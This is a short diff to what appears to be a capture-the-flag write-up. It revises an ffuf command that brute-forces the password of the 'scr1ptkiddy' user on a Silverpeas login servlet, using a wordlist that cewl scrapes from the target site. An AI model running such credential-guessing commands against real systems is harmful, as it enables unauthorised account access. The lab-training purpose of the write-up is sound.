@@ -240,10 +240,8 @@ $ cewl http://<target_machine_URL>:80 -w passwords.txt
 
 Using the generated passwords word list with _**ffuf,**_ for the _**scr1ptkiddy**_ user
 
-```bash
-$ ffuf -X POST -u http://<target_machine_URL>:8080/AuthenticationServlet?Login=scr1ptkiddy&password=FUZZ&DomainId=0 -w passwords.txt 
-
-```
+<pre class="language-bash"><code class="lang-bash"><strong>$ ffuf -u http://&#x3C;target-url>:8080/silverpeas/AuthenticationServlet -X POST -H "content-type:application/x-www-form-urlencoded" -d "Login=scr1ptkiddy&#x26;Password=FUZZ&#x26;DomainId=0" -w &#x3C;wordlist> -fc 302
+</strong></code></pre>
 
 
 
